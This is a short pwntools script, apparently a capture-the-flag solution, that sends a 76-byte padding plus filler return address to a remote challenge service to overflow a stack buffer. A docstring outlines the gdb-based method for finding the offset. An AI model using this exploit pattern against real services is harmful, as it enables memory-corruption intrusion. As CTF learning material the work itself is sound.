"""

Objective of this is to figure learn how to overflow the buffer

first inspect the vulnerable application with gdb, afterwards disassemble the vulnerable function

find out where the buffer will be located (break at gets and look at esp value)

calculate the offet from ebp location

overflow the offset (ebp - buffer_location + 8)

"""

from pwn import *

#sh = process("./buffman")
sh = remote("challenge.ctf-fun.xyz", 14007)

offset = b"A" * 76
ret_addr = b"A" * 4

payload = offset + ret_addr

sh.sendline(payload)
sh.interactive()